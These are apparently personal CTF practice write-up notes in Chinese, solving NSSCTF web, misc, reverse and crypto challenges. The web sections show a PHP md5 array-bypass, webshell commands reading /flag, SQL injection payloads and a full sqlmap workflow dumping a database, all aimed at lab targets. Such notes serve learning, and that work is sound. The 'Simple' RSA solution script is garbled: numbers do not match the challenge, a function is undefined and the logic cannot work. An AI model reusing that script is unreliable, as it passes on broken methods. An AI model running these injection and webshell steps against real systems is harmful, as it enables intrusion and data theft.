  highlight_file(__FILE__);
#highlight_file() 函数会将文件内容以语法高亮的形式输出到页面，方便用户查看源码。
#__FILE__ 是PHP预定义常量，表示当前文件路径
include 'flag2.php';
#包含外部文件 ， flag2.php 中定义了 $flag 变量（存储着我们要获取的flag）
#通过 include 可以在当前文件中访问这个变量。
if (isset($_GET['name']) && isset($_POST['password'])){ 
#检查请求参数 ：判断URL中是否存在 name （GET参数）和表单中是否存在 password （POST参数）。 
#isset() 函数用于检查变量是否已设置且不为NULL。
  $name = $_GET['name'];
  #获取GET参数 ：将URL中传递的 name 参数值赋给 $name 变量。
  #例如： ?name=abc 会将 $name 设为 abc
  $password = $_POST['password'];
  #获取POST参数 ：将表单中传递的 password 参数值赋给 $password 变量。
  if ($name != $password && md5($name) == md5($password)){
#核心条件判断 ： 1. $name != $password ：要求 name 和 password 的值 不相等 ；
#2. md5($name) == md5($password) ：要求 name 和 password 的 MD5哈希值相等 ； 
#“&&”表示合取。两个条件需同时满足
    echo $flag;#输出 flag2.php 中定义的 $flag 变量
  else {
    echo "wrong!";
  }

}
else {
  echo 'wrong!';
}
?>
```

![](<2025 NSSCTF/file-20260331130228500.png)

EXECUTE

![](<2025 NSSCTF/file-20260331130228518.png)

### 漏洞原理
+ 当PHP的 md5() 函数接收 数组 时，会返回 NULL
+ md5(array('1')) == md5(array('2')) 结果为 true （都返回 NULL ）
+ 但 array('1') != array('2') 结果也为 true （不同的数组实例）
+ 因此满足条件 $ name !=  $password && md5($ name) == md5( $password)

### 核心漏洞原理
+ 当PHP的 md5() 函数接收 数组 作为参数时，会返回 NULL （而不是报错）。
+ 例如： md5(array('1')) 和 md5(array('2')) 都会返回 NULL 。
+ 因此： md5(array('1')) == md5(array('2')) 结果为 true （因为两个都返回 NULL ）。
+ 但 array('1') != array('2') 结果也为 true （因为它们是 不同的数组实例 ）。
+ 这就满足了核心条件： $ name !=  $password && md5($ name) == md5( $password) 。

### 为什么用数组可以绕过？
+ GET参数传 name[]=1 ：表示 $name 是一个 数组 ，值为 array('1') 。
+ POST参数传 password[]=2 ：表示 $password 是一个 数组 ，值为 array('2') 。
+ array('1') != array('2') → true （不同数组实例）。
+ md5(array('1')) == md5(array('2')) → true （都返回 NULL ）。
+ 因此条件成立，输出 flag 。

### 总结
这个题目利用了PHP md5() 函数处理数组时的 特殊行为 （返回NULL），通过构造不同的数组参数，绕过了“值不同但MD5相同”的条件，从而获取到flag。这是Web安全中经典的 类型混淆漏洞 。

### [SWPUCTF 2021 新生赛]caidao
#### #RCEPHP #信息收集
![](<2025 NSSCTF/file-20260331130228263.png)

法一：打开网页看到一句话木马命令（想到中国蚁剑）

![](<2025 NSSCTF/file-20260331130228242.png)

![](<2025 NSSCTF/file-20260331130228233.png)

退到最外层，直接找到flag

![](<2025 NSSCTF/file-20260331130228224.png)

NSSCTF{62487fd7-b969-4456-a318-f777ccbb1cc1}

法二：Hackbar，根据页面提示使用POST方式以wllm为参传值；  
先传入system("ls /");查出根目录下有flag文件；在传入system("cat /flag");查看flag。

`**wllm=system("ls /");**`

![](<2025 NSSCTF/file-20260331130228135.png)

`wllm=system('cat /flag');`

![](<2025 NSSCTF/file-20260331130228145.png)

NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}

法三：Burpsuite

Repeater把GET改为POST，右侧Inspector添加请求主体参数。

![](<2025 NSSCTF/file-20260331130228125.png)

发送查看响应：

![](<2025 NSSCTF/file-20260331130228116.png)

![](<2025 NSSCTF/file-20260331130228108.png)

NSSCTF{71963bd4-678f-4d99-96d5-4c9fba40ad5e}

## 3.Misc

### 无标题文档

![](<2025 NSSCTF/file-20260331130230758.png>)
![](<2025 NSSCTF/file-20260331130230727.png>)

### [BJDCTF 2020]鸡你太美  
#### #编码分析 #脚本编写 #GIF提取
![](<2025 NSSCTF/file-20260331130228606.png)

这个gif文件没有正确显示。文件头修复：

![](<2025 NSSCTF/file-20260331130228580.png)

NSSCTF{zhi-yin-you-are-beautiful}

### Misc

### [长城杯 2021 院校组]签到
#### #编码分析 #字符编码ASCII
> #### 5a6d78685a3374585a57786a6232316c5833527658324e6f5957356e5932686c626d64695a544639

先hexadecimal再base64

flag{Welcome_to_changchengbe1}

## 4.Pwn

## 5.Reverse

### [MoeCTF 2021]midpython
#### #Python #自定义逻辑 #REVERSE
![](<2025 NSSCTF/file-20260331130228640.png)

[https://cn.bing.com/search?q=pyinstxtractor](https://cn.bing.com/search?q=pyinstxtractor)

这个工具可以将PyInstaller编译的.exe文件反编译回源代码.py文件

```plain
python pyinstxtractor.py 文件名
```

![](<2025 NSSCTF/file-20260331130228597.png)

获得大量文件。寻找核心的Midpython.pyc，使用**pycdc**

![](<2025 NSSCTF/file-20260331130228623.png)

![](<2025 NSSCTF/file-20260331130228615.png)

```python
key = [
    69,
    70,
    79,
    72,
    88,
    75,
    85,
    127,
    89,
    85,
    74,
    19,
    74,
    122,
    107,
    103,
    75,
    77,
    9,
    73,
    29,
    28,
    67] 
xxor = lambda x, y: x ^ y ^ 11
xoor = lambda x, y: xxor(x, y) ^ 45
xorr = lambda x, y: xoor(x, y) ^ 14
length = len(key)
ipt = input('>>>input your flag:\n>>>')
flag = 1
if len(ipt) == length:
    for i in range(length):
        if xorr(ord(ipt[i]), i) != key[i]:
            flag = 0
flag = 0
if flag == 1:
    print('>>>Right!!')
else:
    print('>>>Wrong!!')
```

```plain
xorr(x, y) = xoor(x, y) ^ 14 = ((x ^ y ^ 11) ^ 45) ^ 14
```

```python
key = [69,70,79,72,88,75,85,127,89,85,74,19,74,122,107,103,75,77,9,73,29,28,67]
#定义一个名为 key 的列表，包含23个整数，这些整数是加密后的密文数据
xxor = lambda x, y: x ^ y ^ 11
xoor = lambda x, y: xxor(x, y) ^ 45
xorr = lambda x, y: xoor(x, y) ^ 14
flag= [] #定义空列表 flag ，用于存储解密后的字符
for i in range(len(key)): #外层循环：遍历 key 列表的每个元素， i 是当前元素的索引
    for x in range(32, 127): #range() 函数左闭右开 # 内层循环：遍历ASCII码32到126的所有可打印字符
        if xorr(x, i) == key[i]:#- 条件判断：如果将当前字符 x 和索引 i 传入 xorr 函数的结果等于 key[i]，即找到了解密当前位置字符的正确ASCII码
            flag.append(chr(x))#如果条件成立，将ASCII码 x 转换为对应字符，添加到 flag 列表
            break #跳出内层循环，继续处理 key 列表的下一个元素
print(''.join(flag))
```

> 选择32~126的原因：
>
> ASCII（美国标准信息交换码）将字符分为几个主要范围：
>
> 0-31 ：控制字符（不可打印），如换行符（\n）、制表符（\t）、回车符（\r）等，这些字符在屏幕上无法正常显示为可见字符。
>
> 32 ：空格字符，是唯一可打印的控制字符。
>
> 33-126 ：可打印字符，包括所有常用字符：标点符号（如!、@、#、$等）、数字（0-9）、大写字母（A-Z）、小写字母（a-z）、其他符号（如=、+、-、*等）。
>

moectf{Pyth0n_M@st3r!!}

### 3.Crypto

# 2025 NSSCTF 积累之（四）
## 1.Crypto

### [羊城杯_2022]签个到

附件：231.txt

> ZMJTPM33TL4TRMYRZD3JXAGOZVMJRLWEZMFGFAEIZV2GVMOMZZ3JTZ3RUR2U2===
>

法一：ciphey一把梭

NSSCTF{68bedd7e6ab3ba1fe965b54d9c7c3d94}
![](<2025 NSSCTF/file-20260331130230747.png>)

法二：脑筋急转弯

+ 文末三个“=”显然不是base64编码。
+ 文件名提示：倒着看13和32
+ rot13和base32解密即可

NSSCTF{68bedd7e6ab3ba1fe965b54d9c7c3d94}
![](<2025 NSSCTF/file-20260331130230779.png>)
![](<2025 NSSCTF/file-20260331130230789.png>)

### [TCTF 2019]babyrsa 
#### #AMM #Crypto #RSA
RSA challs are always easy, right? Even if N is not a integer.

### [羊城杯 2020]Simple
#### #RSA #Crypto
```python
from Crypto.Util.number import *
from Crypto.Cipher import DES
import gmpy2
from secret import flag
import random

key = "abcdefgh"

def des_encrypt(m):
    des = DES.new(key, DES.MODE_ECB)
    res = des.encrypt(m)
    return res

def gen_key():
    p = getPrime(2048)
    q = getPrime(2048)
    n = p * q
    bit = n.bit_length()
    phi_n = (p - 1) * (q - 1)
    num = random.randint(1, 100)
    while True:
        u = getPrime(bit / 4 - num)
        if gmpy2.gcd(u, phi_n) != 1:
            continue
        t = gmpy2.invert(u, phi_n)
        e = bytes_to_long(des_encrypt(long_to_bytes(t)))
        if gmpy2.gcd(e, phi_n) == 1:
            break
    return (n, e)

P = getPrime(1024)
Q = getPrime(1024)
N = P * Q
E = 65537
lcm = gmpy2.lcm(P-1, Q-1)
e1 = gmpy2.invert(getPrime(730), lcm)
e2 = gmpy2.invert(getPrime(730), lcm)
m = bytes_to_long(flag)
c = pow(m, E, N)
print "N = " + str(N)
print "e2 = " + str(e2)
print "c = " + str(c)
_n, _e = gen_key()
_c = pow(e1, _e, _n)
print "_n = " + str(_n)
print "_e = " + str(_e)
print "_c = " + str(_c)

# N = 14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241
# e2 = 27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289
# c = 6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813
# _n = 440489238264900860776949063845200558734341182253911040104689726634414488997095518284964514078079911856352824174173937251558842251349762631716798307360995414545464514355957499460396352456341058329671470384493547042182238690727766731554287411757022792467324815342497916894285866240516524768645049867582541899123632009100512965460004548382054578461249990158442675234477122521189649316341623637146867589119951831385717513964941787562068891523060843170463600255518728070958509224053460041184869943038887434435024428311063533345514827827485121055022245800823723487812635502090530820946638405345755666124356919178290008475459419571761406117827422883820901663916276191422633940699113760516149002609672230610575442643822241126824287790055264162725209120192661985259423924307785452001927701323647247782658775780117642900694831475681037634691806232211286493187121464506122012889644137364079403183353774265910554863733455161820449073656744610495110838881353269890437984975607744603113572453211439334880155671730821755361054781243639407912133971530394031933785051770725331242932929244719594830548310768937037042243794551163891451545574837838357398072638709907958216067999891842395376953596940377457308329336524488962532620850237570279134567668379
# _e = 861605654852236668414010386016782729745549477722901970933220380452652052018502113737968204529790495739233258572209422774257139256367928649554562561889013164344608269555777150446651170697255381344437283003508476336814132594917061838422072660017477530465048729471603537912401826065081663165440462979219418291010867656746870617893935758241591032350010782861988742885918015532494020406350897048575155800941991107973433915573030255070411073793489218782862225921465295055907689734413881263179029741870520797816282420230090879687287575328294171448819803530205292587159921154471289747571107461754730577787617451127061265552788125691266357724955508391085485034126227212788895416902189479587194999818764639403752596165043883295506465916277734482380252399557395621566461322664559344483889187037851178431011220134914560438657522787409632677020269086895142488669203469256629173438313487046130238010206678820035631793666627274457756812810094004185303422637897314225624079032617334487815628021058997628511963565055629435278956251869329025544623291223984190562109149316159243565323565271491356378189561005084676592786453581431393651385181326525455441155960432946682976515756161038293313433862078763004704003356983371787414787104076401121444383911561
# _c = 305937839546594439230463861584604201077374759167468410827830943528403007941779658881672477705113617614828611332427199124217887937391378281943856159571057598203709366891547401974326016980711130197275312149966105151573748299654404630150641461765232935912266448303266990247145252052886920248198006212876273661195636104435277145396636985516064154534488750879453474211852461463041960835745695368577903786702607508492658563272121038693371752289017330781719235752018697635304458321008407930986565779826278048082764754367267460637798512780153281325733348999426407049795270044819657399403071013496169060640127279409914638535996355848933378734045908205536540619564723586905257569498716707820544351092379516465943537383422680357333849248129118148543389733395686399565999586899123087310025442994131218237679518267106194962305629529210402269726736072967966518381350920965727690274018080619332676536005722214955949897632990356174168234408837737546230730400434240785496100281815168806724358191550743656843853383646410487436540166360406982096949178466861150173527305369007546917550634679211293496458282787881244581230558011582720632502886494712233308474151958909251857281750741736910202763888790654287328846201724930302778996046434656839999091303411
```

```python
from Crypto.Util.number import *
import gmpy2
from secret import flag
import random
from Crypto.Cipher import DES

key = "abcdefgh"

def des_encrypt(m):
    des = DES.new(key, DES.MODE_ECB)
    return des.encrypt(m)

# 解密 RSA 密文 c
N = 14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108952933114868444051393460941288494109165159486153060608698217486246173960470535441658750383613015149293771436561419458366421
E = 65537
c = 6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813
m = pow(c, pow(E, -1, phi(N)), N)
print("flag:", m)

# 解密 DES 加密的 t (用于生成 e)
def des_encrypt(m):
    des = DES.new(key, DES.MODE_ECB)
    return des.encrypt(m)

t_bytes = long_to_bytes(pow(27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383573980726387099817958216067999891842395376953596940377457308329336524488962532620850237570279134567668379
t = int(t_bytes)
e = bytes_to_long(des_encrypt(long_to_bytes(t)))
print("e:", e)

# 解密 DES 加密的 t 用于生成 e
def decrypt_t():
    t_bytes = long_to_bytes(pow(27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383573980726387099817958216067999891842395376953596940377457308329336524488962532620850237570279134567668379, 1)
    des = DES.new(key, DES.MODE_ECB)
    return des.decrypt(t_bytes)

t_decrypted = decrypt_t()
print("t:", t_decrypted)

```

## 2.Web

### [陇剑杯_2021]jwt（问1）

追踪http流

![](<2025 NSSCTF/file-20260331130230881.png>)

> token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc
>

![](<2025 NSSCTF/file-20260331130230890.png>)

NSSCTF{jwt}

### [鹤城杯 2021]流量分析
#### #流量分析 #日志审计 #脚本编写
抢分做法：一把梭

![](<2025 NSSCTF/file-20260331130228782.png)

回顾：

![](<2025 NSSCTF/file-20260331130228799.png)

1. 发现大量HTTP请求包含SQL盲注特征

2. 攻击者使用ASCII逐字符提取技术，通过判断每个位置字符的ASCII值来获取flag

3. 这种技术是典型的基于响应的SQL盲注攻击

攻击者通过盲注技术获取了存储在数据库表 t 中的flag字段内容。

flag{w1reshARK_ez_1sntit}

### 3.Misc

### [ByteCTF 2019]BabyBlog
#### #二次注入 #正则RCE #diable_function绕过
### ![](<2025 NSSCTF/file-20260331130228447.png)

### [第五空间 2021]WebFTP
#### #目录扫描 #信息收集 #.git泄露
![](<2025 NSSCTF/file-20260331130228045.png)

使用御剑工具扫描，发现大量域名

![](<2025 NSSCTF/file-20260331130227997.png)

![](<2025 NSSCTF/file-20260331130228026.png)![](<2025 NSSCTF/file-20260331130228006.png)

NSSCTF{f632d0a0-0321-4df6-b3b7-fae9e4c0b269}



**Robots**

昨天十三年社团讲课，讲了Robots.txt的作用，小刚上课没有认真听课正在着急，你能不能帮帮忙

![](<2025 NSSCTF/file-20260331130227988.png)

![](<2025 NSSCTF/file-20260331130227970.png)

flag{29d2b23a9f2145888d1f8c76e2b4a8b4}



[SWPUCTF 2021 新生赛]easy_sql

SQL注入报错注入布尔盲注

  第一步：信息收集（基础侦察）

  目标： 确认目标可达，收集基本信息

`curl -I "http://node4.anna.nssctf.cn:24443/"`

![](<2025 NSSCTF/file-20260331130227979.png)

看什么：

+ HTTP状态码：200 OK（目标存活）
+ Server：nginx/1.14.2（Web服务器信息）
+ X-Powered-By：PHP/5.6.40（后端语言，老版本可能有漏洞）

 经验： curl -I 比直接访问页面更快，只看头部信息，不下载内容！

第二步：分析页面，找参数

  目标： 找到可能存在SQL注入的参数

`curl -s "http://node4.anna.nssctf.cn:24443/"`

![](<2025 NSSCTF/file-20260331130227960.png)

Ctrl+U查看源代码也可

![](<2025 NSSCTF/file-20260331130227941.png)

观察结果：

+ 页面标题："参数是 wllm" ← 重要线索！
+ 页面内容："球球你输入点东西吧！" ← 说明需要输入参数

推理： 存在一个叫 wllm 的GET参数

  测试参数：

`curl -s "http://node4.anna.nssctf.cn:24443/?wllm=test"`

![](<2025 NSSCTF/file-20260331130227951.png)

先用普通值测试参数是否被处理，页面变化=参数有效

  第三步：确认SQL注入漏洞

  目标： 验证是否存在SQL注入

`curl -s "http://node4.anna.nssctf.cn:24443/?wllm=test"`

  观察什么：  
  如果看到SQL错误信息，说明存在注入！比如：  
  You have an error in your SQL syntax...

经验： 单引号 ' 是最简单的SQL注入测试字符，能快速暴露漏洞！

 

 第四步：SQLMap自动化攻击

  现在开始真正使用SQLMap！

  4.1 基础扫描（找注入点）

  命令：  
`sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch`

  参数解释：

+ -u：目标URL
+ ?wllm=1：给参数一个普通值
+ --batch：自动选择，不问问题

  看什么：  
  SQLMap会告诉你：

+ 注入类型（Boolean、Time、Error等）
+ 注入技术（UNION、Boolean等）

![](<2025 NSSCTF/file-20260331130227933.png)

数据库信息：back-end DBMS: MySQL >= 5.0 (MariaDB fork)  
  web application technology: Nginx 1.14.2, PHP 5.6.40

意思是：

+ 数据库：MySQL 5.0以上版本,MariaDB分支
+ Web服务器：Nginx 1.14.2
+ 后端语言：PHP 5.6.40

  SQLMap找到了4种注入方式：

1. Boolean-based blind（布尔盲注）

  Payload: wllm=1' AND 5235=5235 AND 'aqWL'='aqWL  
  原理： 通过True/False判断来获取信息  
  特点： 速度慢，但很稳定

2. Error-based（报错注入） ⭐推荐

  Payload: wllm=1' AND (SELECT 9989 FROM(SELECT COUNT(*),CONCAT(...))x...  
  原理： 让数据库报错，在错误信息中显示数据  
  特点： 速度快！一次性获取大量信息

3. Time-based blind（时间盲注）

  Payload: wllm=1' AND (SELECT 7527 FROM (SELECT(SLEEP(5)))esur)...  
  原理： 通过延时来判断True/False  
  特点： 最慢，但最通用

4. UNION query（联合查询注入） ⭐推荐

  Payload: wllm=-4242' UNION ALL SELECT NULL,NULL,CONCAT(...)-- -  
  原理： 通过UNION合并查询直接显示数据  
  特点： 最快！最直接！



4.2 枚举数据库

  命令：  
 `sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch --dbs`

  参数解释：

+ --dbs：列出所有数据库

![](<2025 NSSCTF/file-20260331130227915.png)

 test_db    ← 这个看起来可疑！

  本小姐的观察技巧： test_db 明显不是默认数据库，肯定是放flag的地方！

  4.3 枚举表  
`sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db --tables`

  新增参数：

+ -D test_db：指定数据库
+ --tables：列出该数据库的所有表

![](<2025 NSSCTF/file-20260331130227924.png)

  4.4 查看表结构

`sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db -T test_tb --columns`

  新增参数：

+ -T test_tb：指定表
+ --columns：查看表结构

![](<2025 NSSCTF/file-20260331130227905.png)

  4.5 获取FLAG！

  最后一步：  
sqlmap -u "http://node4.anna.nssctf.cn:24443/?wllm=1" --batch -D test_db -T test_tb --dump

  新增参数：

+ --dump：导出表中的所有数据

![](<2025 NSSCTF/file-20260331130227896.png)

NSSCTF{ecd98b8f-2324-48e6-9785-0b5ec164a0ee}

  🧠 SQLMap使用思路总结

  核心思路流程：

1. 信息收集 → 2. 找参数 → 3. 确认注入 → 4. SQLMap自动化

  SQLMap标准流程：

  找注入点 → 枚举数据库 → 枚举表 → 查看结构 → 导出数据

  常用命令组合：

# 基础测试
sqlmap -u "URL?param=1" --batch

# 找数据库
sqlmap -u "URL?param=1" --batch --dbs

# 找表
sqlmap -u "URL?param=1" --batch -D dbname --tables

# 看结构
sqlmap -u "URL?param=1" --batch -D dbname -T tablename --columns

# 获取数据
sqlmap -u "URL?param=1" --batch -D dbname -T tablename --dump





1. 快速判断目标：
+ 看到"参数是xxx" → 直接用那个参数名
+ 页面简单 → 通常是入门级SQL注入
2. SQLMap参数优先级：
+ --batch：永远加上，省去手动选择
+ --dbs → --tables → --columns → --dump：标准流程
3. 数据库命名规律：
+ test_db, flag_db, challenge_db：90%放flag
+ information_schema, mysql：系统数据库，不用看
4. 表名规律：
+ flag, test_tb, admin：重点关注的表
+ users：通常放用户信息，可能有flag
5. 避坑指南：
+ 用curl -I先测试连通性，避免SQLMap卡死
+ 看到--batch参数，SQLMap就不会一直问问题
+ 如果SQLMap卡住，用--timeout=10限制时间

---

  遇到问题时：

+ SQLMap报错 → 检查URL是否正确
+ 找不到数据库 → 可能权限不够或注入点错误
+ 卡住不动 → 加--timeout参数

## 3.Misc

### 喜欢我的压缩包么__初级_

题目：可恶，学习资料的密码忘了！！！  
几位数来着，哦哦，6位

1. 使用Hashcat暴力破解。















2. 使用Advanced Archive Password Recovery暴力破解。
![](<2025 NSSCTF/file-20260331130230628.jpeg>)

得到口令114514，解出压缩包中的flag。

### [SWPUCTF 2021 新生赛]gif好像有点大 
#### #GIF #提取二维码 #图片隐写
纯找。

![](<2025 NSSCTF/file-20260331130228571.png)



### Web

### [NISACTF 2022]huaji？
#### #图片隐写 #压缩包分析 #图片分离
![](<2025 NSSCTF/file-20260331130228421.png)

binwalk提取文件：

一个加密zip内含flag

![](<2025 NSSCTF/file-20260331130228396.png)

接下来找解压密码。原图片应该还有未发掘信息。

![](<2025 NSSCTF/file-20260331130228412.png)

6374665f4e4953415f32303232

![](<2025 NSSCTF/file-20260331130228387.png)

ctf_NISA_2022。解压

![](<2025 NSSCTF/file-20260331130228404.png)

flag{Nls@_FumYEnnOjy}

## 4.Pwn

## 5.Reverse

### [SWPUCTF 2021 新生赛]非常简单的逻辑题
#### #Python #语言逆向 #逆向技术
```python
flag = 'xxxxxxxxxxxxxxxxxxxxx'
s = 'wesyvbniazxchjko1973652048@$+-&*<>'#s是一个字符集，包含34个字符
result = ''
for i in range(len(flag)):#对于flag中的每个字符，执行以下操作
    s1 = ord(flag[i])//17
    s2 = ord(flag[i])%17
    result += s[(s1+i)%34]+s[-(s2+i+1)%34]# 结果字符串result添加两个字符：
print(result)
# result = 'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'
#给了个结果，让我们逆向原本的flag
```

```python
# 已知的加密结果
result = 'v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i'
# 字符集
s = 'wesyvbniazxchjko1973652048@$+-&*<>'
# 逆向解密过程
flag = ''
# 遍历result中的每两个字符
for i in range(0, len(result), 2):
    # 获取当前两个字符
    c1 = result[i]
    c2 = result[i+1]
    # 计算字符在s中的索引
    idx1 = s.index(c1)
    idx2 = s.index(c2)
    # 计算实际的s1和s2
    # 对于第一个字符：idx1 = (s1 + i//2) % 34
    # 对于第二个字符：idx2 = (34 - (s2 + i//2 + 1) % 34) % 34
    # 注意：第二个字符的索引计算是因为s[-(s2+i+1)%34]相当于s[(34 - (s2+i+1)%34) % 34]
    pos = i // 2
    # 计算s1的可能值
    s1 = (idx1 - pos) % 34
    # 计算s2的可能值
    # 因为 idx2 = (34 - (s2 + pos + 1) % 34) % 34
    # 所以 (s2 + pos + 1) % 34 = (34 - idx2) % 34
    # 所以 s2 = (34 - idx2 - pos - 1) % 34
    s2 = (34 - idx2 - pos - 1) % 34
    # 计算原始字符的ASCII值
    ascii_val = s1 * 17 + s2
    # 将ASCII值转换为字符
    flag_char = chr(ascii_val)
    # 添加到flag中
    flag += flag_char
print(f"解密得到的flag: {flag}")
```

NSSCTF{Fake_RERE_QAQ}
